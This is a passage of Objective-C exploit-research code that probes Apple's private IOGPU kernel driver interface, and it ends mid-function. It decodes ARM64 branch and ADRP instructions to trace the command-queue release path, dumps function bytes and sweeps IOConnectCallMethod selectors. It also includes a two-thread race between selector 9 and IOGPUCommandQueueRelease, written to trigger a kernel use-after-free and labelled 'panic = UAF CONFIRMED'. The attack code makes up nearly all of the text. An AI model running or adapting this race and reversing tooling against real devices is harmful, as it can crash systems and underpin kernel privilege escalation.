    if (!pQueueRelease) { [out appendString:@"STOP no sym\n"]; return out; }

    uint8_t *p = (uint8_t *)pQueueRelease;
    [out appendFormat:@"queueRelease=0x%llx\n", (uint64_t)p];

    // The stub: cbz x0, ret; b target; ret; pacibsp
    // Read the B instruction at offset 4
    uint32_t bInst = *(uint32_t *)(p + 4);
    [out appendFormat:@"b inst at +4: 0x%08x\n", bInst];

    // B instruction: 0001 01 | imm26
    // Target = PC + (imm26 << 2)  where PC = &bInst
    if ((bInst >> 26) == 0x05) {  // 0b000101 = 5
        int32_t imm26 = bInst & 0x03ffffff;
        // Sign-extend 26-bit
        if (imm26 & 0x02000000) imm26 |= ~0x03ffffff;
        int64_t offset = (int64_t)imm26 << 2;
        uint8_t *target = p + 4 + offset;
        [out appendFormat:@"branch target=0x%llx (offset=0x%llx)\n\n", (uint64_t)target, (int64_t)offset];

        // Dump 0x800 bytes from the target
        [out appendString:@"--- finalize impl bytes (0x800) ---\n"];
        for (int i = 0; i < 0x800; i += 16) {
            NSMutableString *line = [NSMutableString string];
            [line appendFormat:@"%03x:", i];
            for (int j = 0; j < 16; j++)
                [line appendFormat:@" %02x", target[i+j]];
            [out appendString:line];
            [out appendString:@"\n"];
        }

        // Search for mov w1, #imm in the target
        [out appendString:@"\n--- mov w1, #imm in finalize ---\n"];
        for (int i = 0; i < 0x800; i += 4) {
            uint32_t inst = *(uint32_t *)(target + i);
            uint32_t op = inst & 0xff800000;
            if (op == 0x52800000) {
                uint32_t rd = inst & 0x1f;
                uint32_t imm = (inst >> 5) & 0xffff;
                if (rd == 1) {
                    // Also check what w3 is set to (scalar count)
                    uint32_t nextInst = *(uint32_t *)(target + i + 4);
                    uint32_t w3val = 0xffffffff;
                    if ((nextInst & 0xff800000) == 0x52800000 && (nextInst & 0x1f) == 3) {
                        w3val = (nextInst >> 5) & 0xffff;
                    }
                    [out appendFormat:@"  0x%03x: mov w1, #%u  w3=%u\n", i, imm, w3val];
                }
            }
        }

        // Also search for mov w0, #imm (might set selector in w0
        // if calling convention differs)
        [out appendString:@"\n--- mov w0, #imm in finalize ---\n"];
        for (int i = 0; i < 0x800; i += 4) {
            uint32_t inst = *(uint32_t *)(target + i);
            uint32_t op = inst & 0xff800000;
            if (op == 0x52800000) {
                uint32_t rd = inst & 0x1f;
                uint32_t imm = (inst >> 5) & 0xffff;
                if (rd == 0 && imm > 0 && imm < 100) {
                    [out appendFormat:@"  0x%03x: mov w0, #%u\n", i, imm];
                }
            }
        }
    } else {
        [out appendString:@"Not a B instruction -- dumping 0x400 bytes\n"];
        for (int i = 0; i < 0x400; i += 16) {
            NSMutableString *line = [NSMutableString string];
            [line appendFormat:@"%03x:", i];
            for (int j = 0; j < 16; j++)
                [line appendFormat:@" %02x", p[i+j]];
            [out appendString:line];
            [out appendString:@"\n"];
        }
    }

    [out appendString:@"\nDONE -- paste this text back\n"];
    return out;
}


+ (NSString *)runP010FollowFinalize2 {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"P010 follow PAC stub to real finalize\n\n"];

    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!iogpu) { [out appendString:@"STOP no IOGPU\n"]; return out; }

    typedef void (*QueueRelease_t)(void *);
    QueueRelease_t pQueueRelease = (QueueRelease_t)dlsym(iogpu, "IOGPUCommandQueueRelease");
    if (!pQueueRelease) { [out appendString:@"STOP no sym\n"]; return out; }

    uint8_t *p = (uint8_t *)pQueueRelease;

    // Step 1: Follow B at offset 4 to stub table
    uint32_t bInst = *(uint32_t *)(p + 4);
    if ((bInst >> 26) != 0x05) { [out appendString:@"Not a B\n"]; return out; }
    int32_t imm26 = bInst & 0x03ffffff;
    if (imm26 & 0x02000000) imm26 |= ~0x03ffffff;
    int64_t boff = (int64_t)imm26 << 2;
    uint8_t *stub = p + 4 + boff;
    [out appendFormat:@"stub=0x%llx\n", (uint64_t)stub];

    // Step 2: Decode ADRP+ADD at stub to find real function
    // ADRP X16, page: 1 immlo[2] 10000 immhi[19] Rd[5]
    uint32_t adrp = *(uint32_t *)stub;
    uint32_t add = *(uint32_t *)(stub + 4);

    [out appendFormat:@"adrp=0x%08x add=0x%08x\n", adrp, add];

    // Decode ADRP
    if ((adrp & 0x9f000000) != 0x90000000) {
        [out appendString:@"Not ADRP\n"];
        return out;
    }
    uint32_t rd = adrp & 0x1f;
    int64_t immlo = (adrp >> 29) & 0x3;
    int64_t immhi = (adrp >> 5) & 0x7ffff;
    int64_t imm = (immhi << 2) | immlo;
    // Sign-extend 21-bit
    if (imm & 0x100000) imm |= ~0x1fffff;
    uint64_t page = ((uint64_t)(stub) & ~0xfff) + (imm << 12);
    [out appendFormat:@"ADRP x%u, page=0x%llx\n", rd, page];

    // Decode ADD X16, X16, #imm
    if ((add & 0xffc00000) == 0x91000000) {
        uint32_t addImm = (add >> 10) & 0xfff;
        uint64_t target = page + addImm;
        [out appendFormat:@"ADD imm=%u -> target=0x%llx\n\n", addImm, target];

        // Dump 0x800 bytes from the real function
        uint8_t *func = (uint8_t *)target;
        [out appendString:@"--- real finalize bytes (0x800) ---\n"];
        for (int i = 0; i < 0x800; i += 16) {
            NSMutableString *line = [NSMutableString string];
            [line appendFormat:@"%03x:", i];
            for (int j = 0; j < 16; j++)
                [line appendFormat:@" %02x", func[i+j]];
            [out appendString:line];
            [out appendString:@"\n"];
        }

        // Search for mov w1, #imm (selector for IOConnectCallMethod)
        [out appendString:@"\n--- mov w1, #imm ---\n"];
        for (int i = 0; i < 0x800; i += 4) {
            uint32_t inst = *(uint32_t *)(func + i);
            if ((inst & 0xff800000) == 0x52800000 && (inst & 0x1f) == 1) {
                uint32_t imm = (inst >> 5) & 0xffff;
                // Check next instruction for w3 (scalar count)
                uint32_t nextInst = *(uint32_t *)(func + i + 4);
                uint32_t w3val = 0xffffffff;
                if ((nextInst & 0xff800000) == 0x52800000 && (nextInst & 0x1f) == 3)
                    w3val = (nextInst >> 5) & 0xffff;
                [out appendFormat:@"  0x%03x: mov w1, #%u  w3=%u\n", i, imm, w3val];
            }
        }

        // Also search for movz w1 (32-bit) with larger imms
        [out appendString:@"\n--- movz w1 with hw shift ---\n"];
        for (int i = 0; i < 0x800; i += 4) {
            uint32_t inst = *(uint32_t *)(func + i);
            if ((inst & 0xff800000) == 0x52800000 && (inst & 0x1f) == 1) {
                uint32_t imm = (inst >> 5) & 0xffff;
                uint32_t hw = (inst >> 21) & 0x3;
                if (hw > 0 || imm > 100) {
                    [out appendFormat:@"  0x%03x: movz w1, #0x%x, lsl #%u\n", i, imm, hw*16];
                }
            }
        }
    } else {
        [out appendFormat:@"ADD not found: 0x%08x\n", add];
    }

    [out appendString:@"\nDONE -- paste this text back\n"];
    return out;
}


+ (NSString *)runP010QueueReleaseRace {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"P010 queue release race -- sel=9 vs IOGPUCommandQueueRelease N=100000\n\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");

    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    typedef void *(*DevCreate_t)(io_service_t);
    typedef uint32_t (*GetConn_t)(void *);
    typedef void (*DevRelease_t)(void *);
    typedef void *(*QueueCreate_t)(void *, void *, uint32_t);
    typedef void (*QueueRelease_t)(void *);
    DevCreate_t pDevCreate = (DevCreate_t)dlsym(iogpu, "IOGPUDeviceCreate");
    GetConn_t pGetConn = (GetConn_t)dlsym(iogpu, "IOGPUDeviceGetConnect");
    DevRelease_t pDevRelease = (DevRelease_t)dlsym(iogpu, "IOGPUDeviceRelease");
    QueueCreate_t pQueueCreate = (QueueCreate_t)dlsym(iogpu, "IOGPUCommandQueueCreate");
    QueueRelease_t pQueueRelease = (QueueRelease_t)dlsym(iogpu, "IOGPUCommandQueueRelease");

    CFMutableDictionaryRef m = pMatching("IOGPU");
    io_service_t svc = m ? pGet(*pMainPort, m) : 0;
    if (!svc) { [out appendString:@"STOP no service\n"]; return out; }
    void *dev = pDevCreate(svc);
    if (!dev) { [out appendString:@"STOP no dev\n"]; pRelease(svc); return out; }
    io_connect_t conn = pGetConn(dev);

    // Create queue
    void *args = calloc(1, 0x410);
    *(uint32_t *)((uint8_t *)args + 0x400) = *(uint32_t *)((uint8_t *)dev + 0x08);
    *(uint8_t *)((uint8_t *)args + 0x404) = *(uint8_t *)((uint8_t *)dev + 0x08);
    void *queue = pQueueCreate(dev, args, 0x410);
    free(args);
    if (!queue) { [out appendString:@"STOP no queue\n"]; pDevRelease(dev); pRelease(svc); return out; }

    uint64_t qid1 = *(uint64_t *)((uint8_t *)queue + 0x18);
    [out appendFormat:@"queue=0x%llx conn=%u qid1=0x%llx\n", (uint64_t)queue, conn, qid1];

    // Race: thread 1 fires sel=9 (struct 128 with qid1) in tight loop
    // thread 2 calls IOGPUCommandQueueRelease (destroys queue)
    // N=100000 to maximize race window
    __block volatile int go = 0;
    __block int sel9calls = 0;
    __block int sel9last = 0;

    dispatch_queue_t q1 = dispatch_queue_create("race.sel9", NULL);
    dispatch_queue_t q2 = dispatch_queue_create("race.release", NULL);
    dispatch_group_t grp = dispatch_group_create();

    dispatch_group_async(grp, q1, ^{
        while (!go) { }
        void *inS = calloc(1, 128);
        *(uint64_t *)inS = qid1;
        size_t oc = 0x100;
        void *outS = calloc(1, 0x100);
        for (int i = 0; i < 100000; i++) {
            kern_return_t r = pCall(conn, 9, NULL, 0, inS, 128, NULL, NULL, outS, &oc);
            sel9calls++;
            sel9last = (unsigned)r;
        }
        free(inS); free(outS);
    });

    dispatch_group_async(grp, q2, ^{
        while (!go) { }
        // Small delay to let sel=9 start firing
        for (volatile int i = 0; i < 100; i++) { }
        // Release the queue -- this calls finalize → destroy selector
        pQueueRelease(queue);
    });

    // Start both threads
    go = 1;
    dispatch_group_wait(grp, DISPATCH_TIME_FOREVER);

    [out appendFormat:@"\nsel=9 calls: %d / 100000  last rc: 0x%08x\n", sel9calls, sel9last];
    [out appendString:@"survived = race missed. panic = UAF CONFIRMED.\n"];

    pDevRelease(dev);
    pRelease(svc);

    [out appendString:@"\nDONE -- paste this text back\n"];
    [out appendString:@"If survived: try N=1000000. If panic: UAF confirmed.\n"];
    return out;
}

+ (NSString *)runP010FollowBLChain {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"P010 follow BL chain -- find destroy selector\n\n"];

    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    typedef void (*QueueRelease_t)(void *);
    QueueRelease_t pQueueRelease = (QueueRelease_t)dlsym(iogpu, "IOGPUCommandQueueRelease");
    if (!pQueueRelease) { [out appendString:@"STOP no sym\n"]; return out; }

    uint8_t *p = (uint8_t *)pQueueRelease;

    // Follow B at offset 4 to PAC stub
    uint32_t bInst = *(uint32_t *)(p + 4);
    int32_t imm26 = bInst & 0x03ffffff;
    if (imm26 & 0x02000000) imm26 |= ~0x03ffffff;
    uint8_t *stub = p + 4 + ((int64_t)imm26 << 2);

    // Follow ADRP+ADD to real finalize wrapper
    uint32_t adrp = *(uint32_t *)stub;
    uint32_t add = *(uint32_t *)(stub + 4);
    int64_t immlo = (adrp >> 29) & 0x3;
    int64_t immhi = (adrp >> 5) & 0x7ffff;
    int64_t aimm = (immhi << 2) | immlo;
    if (aimm & 0x100000) aimm |= ~0x1fffff;
    uint64_t page = ((uint64_t)stub & ~0xfff) + (aimm << 12);
    uint32_t addImm = (add >> 10) & 0xfff;
    uint8_t *wrapper = (uint8_t *)(page + addImm);
    [out appendFormat:@"wrapper=0x%llx\n", (uint64_t)wrapper];

    // The wrapper has a BL at offset 0x018
    uint32_t blInst = *(uint32_t *)(wrapper + 0x18);
    [out appendFormat:@"BL at +0x18: 0x%08x\n", blInst];

    if ((blInst >> 26) == 0x25) {
        int32_t blimm26 = blInst & 0x03ffffff;
        if (blimm26 & 0x02000000) blimm26 |= ~0x03ffffff;
        uint8_t *workFunc = wrapper + 0x18 + ((int64_t)blimm26 << 2);
        [out appendFormat:@"workFunc=0x%llx\n\n", (uint64_t)workFunc];

        // Dump 0x1000 bytes
        [out appendString:@"--- work func bytes (0x1000) ---\n"];
        for (int i = 0; i < 0x1000; i += 16) {
            NSMutableString *line = [NSMutableString string];
            [line appendFormat:@"%03x:", i];
            for (int j = 0; j < 16; j++)
                [line appendFormat:@" %02x", workFunc[i+j]];
            [out appendString:line];
            [out appendString:@"\n"];
        }

        // Search for mov w1, #imm
        [out appendString:@"\n--- mov w1, #imm ---\n"];
        for (int i = 0; i < 0x1000; i += 4) {
            uint32_t inst = *(uint32_t *)(workFunc + i);
            if ((inst & 0xff800000) == 0x52800000 && (inst & 0x1f) == 1) {
                uint32_t imm = (inst >> 5) & 0xffff;
                uint32_t w3val = 0xffffffff;
                for (int k = 1; k <= 4; k++) {
                    uint32_t ni = *(uint32_t *)(workFunc + i + k*4);
                    if ((ni & 0xff800000) == 0x52800000 && (ni & 0x1f) == 3) {
                        w3val = (ni >> 5) & 0xffff;
                        break;
                    }
                }
                [out appendFormat:@"  0x%03x: mov w1, #%u  w3=%u\n", i, imm, w3val];
            }
        }

        // Search for mov w1 + BL pairs (selector then call)
        [out appendString:@"\n--- mov w1 (0-55) + BL pairs ---\n"];
        for (int i = 0; i < 0x1000; i += 4) {
            uint32_t inst = *(uint32_t *)(workFunc + i);
            if ((inst & 0xff800000) == 0x52800000 && (inst & 0x1f) == 1) {
                uint32_t imm = (inst >> 5) & 0xffff;
                if (imm > 55) continue;
                for (int k = 1; k <= 8; k++) {
                    uint32_t ni = *(uint32_t *)(workFunc + i + k*4);
                    if ((ni >> 26) == 0x25) {
                        [out appendFormat:@"  0x%03x: mov w1, #%u -> BL at +0x%x\n", i, imm, k*4];
                        break;
                    }
                }
            }
        }
    }

    [out appendString:@"\nDONE -- paste this text back\n"];
    return out;
}


static NSString *p010KrName(unsigned ur) {
    if (ur == 0) return @" OK";
    if (ur == 0xe00002be) return @" NoRes";
    if (ur == 0xe00002c2) return @" BadArg";
    if (ur == 0xe00002c7) return @" NotAcc";
    if (ur == 0xe00002e2) return @" NotPerm";
    return @" NEW";
}

+ (NSString *)runP010AfterReleaseProbe {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"P010 after-release probe -- does Release destroy the kernel queue?\n"];
    [out appendString:@"sel=9 NoRes = queue alive. BadArg after Release = destroyed.\n"];
    [out appendString:@"conn2 sel=9 NoRes = queues shared across connections.\n\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");

    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    typedef void *(*DevCreate_t)(io_service_t);
    typedef uint32_t (*GetConn_t)(void *);
    typedef void (*DevRelease_t)(void *);
    typedef void *(*QueueCreate_t)(void *, void *, uint32_t);
    typedef void (*QueueRelease_t)(void *);
    DevCreate_t pDevCreate = (DevCreate_t)dlsym(iogpu, "IOGPUDeviceCreate");
    GetConn_t pGetConn = (GetConn_t)dlsym(iogpu, "IOGPUDeviceGetConnect");
    DevRelease_t pDevRelease = (DevRelease_t)dlsym(iogpu, "IOGPUDeviceRelease");
    QueueCreate_t pQueueCreate = (QueueCreate_t)dlsym(iogpu, "IOGPUCommandQueueCreate");
    QueueRelease_t pQueueRelease = (QueueRelease_t)dlsym(iogpu, "IOGPUCommandQueueRelease");

    CFMutableDictionaryRef m = pMatching("IOGPU");
    io_service_t svc = m ? pGet(*pMainPort, m) : 0;
    if (!svc) { [out appendString:@"STOP no service\n"]; return out; }
    void *dev = pDevCreate(svc);
    if (!dev) { [out appendString:@"STOP no dev\n"]; pRelease(svc); return out; }
    io_connect_t conn = pGetConn(dev);

    void *args = calloc(1, 0x410);
    *(uint32_t *)((uint8_t *)args + 0x400) = *(uint32_t *)((uint8_t *)dev + 0x08);
    *(uint8_t *)((uint8_t *)args + 0x404) = *(uint8_t *)((uint8_t *)dev + 0x08);
    void *queue = pQueueCreate(dev, args, 0x410);
    free(args);
    if (!queue) { [out appendString:@"STOP no queue\n"]; pDevRelease(dev); pRelease(svc); return out; }

    uint64_t qid1 = *(uint64_t *)((uint8_t *)queue + 0x18);
    uint64_t qid2 = *(uint64_t *)((uint8_t *)queue + 0x20);
    [out appendFormat:@"conn1=%u queue=%p qid1=0x%llx qid2=0x%llx\n", conn, queue, qid1, qid2];

    void *inS = calloc(1, 128);
    void *outS = calloc(1, 0x100);
    *(uint64_t *)inS = qid1;

    size_t oc = 0x100;
    kern_return_t r0 = pCall(conn, 9, NULL, 0, inS, 128, NULL, NULL, outS, &oc);
    [out appendFormat:@"sel=9 BEFORE release -> 0x%08x%@\n", (unsigned)r0, p010KrName((unsigned)r0)];

    pQueueRelease(queue);
    [out appendString:@"IOGPUCommandQueueRelease(queue) returned\n"];

    oc = 0x100;
    kern_return_t r1 = pCall(conn, 9, NULL, 0, inS, 128, NULL, NULL, outS, &oc);
    [out appendFormat:@"sel=9 AFTER  release -> 0x%08x%@\n", (unsigned)r1, p010KrName((unsigned)r1)];

    void *dev2 = pDevCreate(svc);
    if (!dev2) {
        [out appendString:@"STOP no dev2\n"];
    } else {
        io_connect_t conn2 = pGetConn(dev2);
        [out appendFormat:@"\nconn2=%u (second IOGPUDeviceCreate)\n", conn2];
        oc = 0x100;
        kern_return_t r2 = pCall(conn2, 9, NULL, 0, inS, 128, NULL, NULL, outS, &oc);
        [out appendFormat:@"sel=9 conn2 same qid1 -> 0x%08x%@\n", (unsigned)r2, p010KrName((unsigned)r2)];

        void *args2 = calloc(1, 0x410);
        *(uint32_t *)((uint8_t *)args2 + 0x400) = *(uint32_t *)((uint8_t *)dev2 + 0x08);
        *(uint8_t *)((uint8_t *)args2 + 0x404) = *(uint8_t *)((uint8_t *)dev2 + 0x08);
        void *queue2 = pQueueCreate(dev2, args2, 0x410);
        free(args2);
        if (queue2) {
            uint64_t q2id1 = *(uint64_t *)((uint8_t *)queue2 + 0x18);
            [out appendFormat:@"queue2 on conn2 qid1=0x%llx\n", q2id1];
            oc = 0x100;
            *(uint64_t *)inS = q2id1;
            kern_return_t r3 = pCall(conn, 9, NULL, 0, inS, 128, NULL, NULL, outS, &oc);
            [out appendFormat:@"sel=9 conn1 with conn2's qid -> 0x%08x%@\n", (unsigned)r3, p010KrName((unsigned)r3)];
            oc = 0x100;
            kern_return_t r4 = pCall(conn2, 9, NULL, 0, inS, 128, NULL, NULL, outS, &oc);
            [out appendFormat:@"sel=9 conn2 with own qid   -> 0x%08x%@\n", (unsigned)r4, p010KrName((unsigned)r4)];
        } else {
            [out appendString:@"queue2 create failed\n"];
        }
        pDevRelease(dev2);
    }

    free(inS);
    free(outS);
    pDevRelease(dev);
    pRelease(svc);

    [out appendString:@"\nDONE -- paste this text back\n"];
    [out appendString:@"AFTER=NoRes: kernel queue survived Release (userspace-only).\n"];
    [out appendString:@"AFTER=BadArg: Release destroyed it. Need 2-conn race.\n"];
    [out appendString:@"conn2 same qid=NoRes: queues are shared -- 2-conn race is possible.\n"];
    return out;
}

+ (NSString *)runP010QueueConnectProbe {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"P010 queue connect probe -- GetID/GetConnect + submit + sel=9 control\n\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");

    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    typedef void *(*DevCreate_t)(io_service_t);
    typedef uint32_t (*GetConn_t)(void *);
    typedef void (*DevRelease_t)(void *);
    typedef void *(*QueueCreate_t)(void *, void *, uint32_t);
    typedef uint32_t (*QueueGetID_t)(void *);
    typedef uint32_t (*QueueGetConn_t)(void *);
    typedef kern_return_t (*QueueSubmit_t)(void *, void *, uint32_t);
    DevCreate_t pDevCreate = (DevCreate_t)dlsym(iogpu, "IOGPUDeviceCreate");
    GetConn_t pGetConn = (GetConn_t)dlsym(iogpu, "IOGPUDeviceGetConnect");
    DevRelease_t pDevRelease = (DevRelease_t)dlsym(iogpu, "IOGPUDeviceRelease");
    QueueCreate_t pQueueCreate = (QueueCreate_t)dlsym(iogpu, "IOGPUCommandQueueCreate");
    QueueGetID_t pGetID = (QueueGetID_t)dlsym(iogpu, "IOGPUCommandQueueGetID");
    QueueGetConn_t pQGetConn = (QueueGetConn_t)dlsym(iogpu, "IOGPUCommandQueueGetConnect");
    QueueSubmit_t pSubmit = (QueueSubmit_t)dlsym(iogpu, "IOGPUCommandQueueSubmitCommandBuffers");

    [out appendFormat:@"syms: GetID=%p GetConnect=%p Submit=%p\n", pGetID, pQGetConn, pSubmit];

    CFMutableDictionaryRef m = pMatching("IOGPU");
    io_service_t svc = m ? pGet(*pMainPort, m) : 0;
    if (!svc) { [out appendString:@"STOP no service\n"]; return out; }

    // Control: fresh conn, NO queue, sel=9 zeroed 128
    void *dev0 = pDevCreate(svc);
    if (!dev0) { [out appendString:@"STOP no dev0\n"]; pRelease(svc); return out; }
    io_connect_t conn0 = pGetConn(dev0);
    void *inS = calloc(1, 128);
    void *outS = calloc(1, 0x100);
    size_t oc = 0x100;
    kern_return_t rc = pCall(conn0, 9, NULL, 0, inS, 128, NULL, NULL, outS, &oc);
    [out appendFormat:@"CONTROL sel=9 no-queue conn=%u -> 0x%08x%@\n\n", conn0, (unsigned)rc, p010KrName((unsigned)rc)];
    pDevRelease(dev0);

    void *dev = pDevCreate(svc);
    if (!dev) { [out appendString:@"STOP no dev\n"]; free(inS); free(outS); pRelease(svc); return out; }
    io_connect_t dconn = pGetConn(dev);

    void *args = calloc(1, 0x410);
    *(uint32_t *)((uint8_t *)args + 0x400) = *(uint32_t *)((uint8_t *)dev + 0x08);
    *(uint8_t *)((uint8_t *)args + 0x404) = *(uint8_t *)((uint8_t *)dev + 0x08);
    void *queue = pQueueCreate(dev, args, 0x410);
    free(args);
    if (!queue) { [out appendString:@"STOP no queue\n"]; pDevRelease(dev); free(inS); free(outS); pRelease(svc); return out; }

    uint64_t raw18 = *(uint64_t *)((uint8_t *)queue + 0x18);
    uint64_t raw20 = *(uint64_t *)((uint8_t *)queue + 0x20);
    uint32_t qid = pGetID ? pGetID(queue) : 0xffffffff;
    uint32_t qconn = pQGetConn ? pQGetConn(queue) : 0;
    [out appendFormat:@"devConn=%u queue=%p raw+0x18=0x%llx raw+0x20=0x%llx\n", dconn, queue, raw18, raw20];
    [out appendFormat:@"GetID=%u GetConnect=%u sameConn=%s\n\n", qid, qconn, (qconn == dconn) ? "YES" : "NO"];

    if (pSubmit) {
        kern_return_t s0 = pSubmit(queue, NULL, 0);
        [out appendFormat:@"Submit(queue, NULL, 0) -> 0x%08x%@\n", (unsigned)s0, p010KrName((unsigned)s0)];
    } else {
        [out appendString:@"Submit symbol MISSING\n"];
    }

    io_connect_t sweepConn = (qconn != 0) ? qconn : dconn;
    [out appendFormat:@"\n--- sweep conn=%u (empty / 1 scalar=GetID / struct128) ---\n", sweepConn];
    for (uint32_t sel = 0; sel < 32; sel++) {
        oc = 0x100;
        kern_return_t rE = pCall(sweepConn, sel, NULL, 0, NULL, 0, NULL, NULL, outS, &oc);
        uint64_t sc = qid;
        oc = 0x100;
        kern_return_t rS = pCall(sweepConn, sel, &sc, 1, NULL, 0, NULL, NULL, outS, &oc);
        *(uint64_t *)inS = qid;
        oc = 0x100;
        kern_return_t rT = pCall(sweepConn, sel, NULL, 0, inS, 128, NULL, NULL, outS, &oc);
        unsigned e = (unsigned)rE, s = (unsigned)rS, t = (unsigned)rT;
        if (e != 0xe00002c2 || s != 0xe00002c2 || t != 0xe00002c2) {
            [out appendFormat:@"sel=%u empty=0x%08x%@  sc1=0x%08x%@  st128=0x%08x%@\n",
             sel, e, p010KrName(e), s, p010KrName(s), t, p010KrName(t)];
        }
    }

    free(inS);
    free(outS);
    pDevRelease(dev);
    pRelease(svc);

    [out appendString:@"\nDONE -- paste this text back\n"];
    [out appendString:@"CONTROL NoRes = sel=9 ignores queue. GetConnect!=devConn = methods live on queue UC.\n"];
    return out;
}

+ (NSString *)runP010MetalSubmitRace {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"P010 Metal serial blit -- NO close (previous crash = dead port)\n\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");
    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");

    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    typedef void *(*DevCreate_t)(io_service_t);
    typedef uint32_t (*GetConn_t)(void *);
    typedef void (*DevRelease_t)(void *);
    DevCreate_t pDevCreate = dlsym(iogpu, "IOGPUDeviceCreate");
    GetConn_t pDevGetConn = dlsym(iogpu, "IOGPUDeviceGetConnect");
    DevRelease_t pDevRelease = dlsym(iogpu, "IOGPUDeviceRelease");
    uint8_t *pSubmit = (uint8_t *)dlsym(iogpu, "IOGPUCommandQueueSubmitCommandBuffers");

    if (pSubmit) {
        [out appendFormat:@"Submit=0x%llx\n", (uint64_t)pSubmit];
        [out appendString:@"Submit bytes: "];
        for (int i = 0; i < 32; i++) [out appendFormat:@"%02x ", pSubmit[i]];
        [out appendString:@"\n--- Submit mov w1 ---\n"];
        for (int i = 0; i < 0x200; i += 4) {
            uint32_t inst = *(uint32_t *)(pSubmit + i);
            if ((inst & 0xff80001f) == 0x52800001) {
                uint32_t imm = (inst >> 5) & 0xffff;
                [out appendFormat:@"  +0x%03x: mov w1, #%u\n", i, imm];
            }
        }
    }

    id<MTLDevice> mtl = MTLCreateSystemDefaultDevice();
    if (!mtl) { [out appendString:@"STOP no Metal\n"]; return out; }
    [out appendFormat:@"Metal: %@ class=%s\n", [mtl name], object_getClassName(mtl)];
    id<MTLCommandQueue> mq = [mtl newCommandQueue];
    if (!mq) { [out appendString:@"STOP no MTL queue\n"]; return out; }
    [out appendFormat:@"MTL queue class=%s\n", object_getClassName(mq)];

    id<MTLBuffer> mtlBuf = [mtl newBufferWithLength:4096 options:MTLResourceStorageModeShared];
    id<MTLCommandBuffer> cb = [mq commandBuffer];
    id<MTLBlitCommandEncoder> blit = [cb blitCommandEncoder];
    if (!blit) { [out appendString:@"STOP no blit encoder\n"]; return out; }
    [blit fillBuffer:mtlBuf range:NSMakeRange(0, 4) value:1];
    [blit endEncoding];
    [cb commit];
    [cb waitUntilCompleted];
    [out appendFormat:@"serial blit status=%ld error=%@\n", (long)[cb status], [cb error]];

    [out appendString:@"\n--- MTLCommandBuffer dump 0x80 ---\n"];
    uint8_t *cbp = (uint8_t *)(__bridge void *)cb;
    for (int i = 0; i < 0x80; i += 16) {
        [out appendFormat:@"%02x:", i];
        for (int j = 0; j < 16; j++) [out appendFormat:@" %02x", cbp[i+j]];
        [out appendString:@"\n"];
    }

    void *iogpuQueue = NULL;
    Class cls = object_getClass(mq);
    while (cls) {
        unsigned int n = 0;
        Ivar *ivars = class_copyIvarList(cls, &n);
        for (unsigned int i = 0; i < n; i++) {
            const char *nm = ivar_getName(ivars[i]);
            if (!nm || !strstr(nm, "ommandQueue")) continue;
            void *val = *(void **)((char *)(__bridge void *)mq + ivar_getOffset(ivars[i]));
            [out appendFormat:@"ivar %s.%s = %p\n", class_getName(cls), nm, val];
            if (val && strcmp(nm, "_commandQueue") == 0) iogpuQueue = val;
        }
        free(ivars);
        cls = class_getSuperclass(cls);
    }

    io_connect_t qconn = 0;
    uint32_t qid = 0;
    [out appendFormat:@"_commandQueue ivar=%p (not calling GetConnect on it)\n", iogpuQueue];

    CFMutableDictionaryRef matching = pMatching("IOGPU");
